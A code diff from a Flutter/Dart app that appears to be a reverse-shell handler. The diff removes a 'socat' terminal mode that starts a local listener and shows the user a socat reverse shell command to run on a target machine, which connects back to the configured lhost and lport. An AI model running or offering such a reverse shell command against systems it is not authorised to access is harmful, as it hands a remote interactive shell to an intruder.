@@ -1142,16 +1142,6 @@ class _TerminalTabState extends State<_TerminalTab>
                       style: const TextStyle(fontSize: 11),
                     ),
                   ),
-                  RadioListTile<String>(
-                    value: 'socat',
-                    groupValue: selected,
-                    onChanged: (v) => setState(() => selected = v!),
-                    title: Text(S.terminalModeSocat),
-                    subtitle: Text(
-                      S.terminalModeSocatDesc,
-                      style: const TextStyle(fontSize: 11),
-                    ),
-                  ),
                 ],
               ),
               actions: [
@@ -1226,91 +1216,6 @@ class _TerminalTabState extends State<_TerminalTab>
       return;
     }
 
-    if (mode == 'socat') {
-      // socat 模式：仅启动本地监听，并给出在目标上执行的 socat 命令
-      final nav = Navigator.of(context);
-      rs.onSession = (session) {
-        if (!mounted) return;
-        nav.push(
-          MaterialPageRoute(
-            builder: (_) => ReverseShellTerminalPage(session: session),
-          ),
-        );
-      };
-      try {
-        await rs.loadConfig();
-        await rs.startListening(port: rs.lport);
-      } catch (e) {
-        if (!mounted) return;
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text(
-              S.snackListenFailed(e),
-              style: const TextStyle(color: Colors.white),
-            ),
-            backgroundColor: AppColors.red,
-            behavior: SnackBarBehavior.floating,
-          ),
-        );
-        return;
-      }
-
-      final cmd =
-          'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';
-
-      if (!mounted) return;
-      await showDialog<void>(
-        context: context,
-        builder: (context) {
-          return AlertDialog(
-            title: Text(S.titleSocatCommand),
-            content: Column(
-              mainAxisSize: MainAxisSize.min,
-              crossAxisAlignment: CrossAxisAlignment.start,
-              children: [
-                Text(
-                  S.socatInstructions,
-                  style: AppTextStyles.caption(
-                    size: 12,
-                    color: AppColors.textSecondary,
-                  ),
-                ),
-                const SizedBox(height: 8),
-                Container(
-                  padding: const EdgeInsets.all(8),
-                  decoration: BoxDecoration(
-                    color: AppColors.bgDark,
-                    borderRadius: BorderRadius.circular(4),
-                    border: Border.all(color: AppColors.border),
-                  ),
-                  child: SelectableText(
-                    cmd,
-                    style: AppTextStyles.terminal(
-                      size: 12,
-                      color: AppColors.cyan,
-                    ),
-                  ),
-                ),
-                const SizedBox(height: 8),
-                Text(
-                  S.socatTips(rs.lport),
-                  style: AppTextStyles.caption(
-                    size: 11,
-                    color: AppColors.textMuted,
-                  ),
-                ),
-              ],
-            ),
-            actions: [
-              TextButton(
-                onPressed: () => Navigator.of(context).pop(),
-                child: Text(S.btnClose),
-              ),
-            ],
-          );
-        },
-      );
-    }
   }
 
   // ── 模式A：分离式（输出区 + 底部输入栏）────────────────────────────────
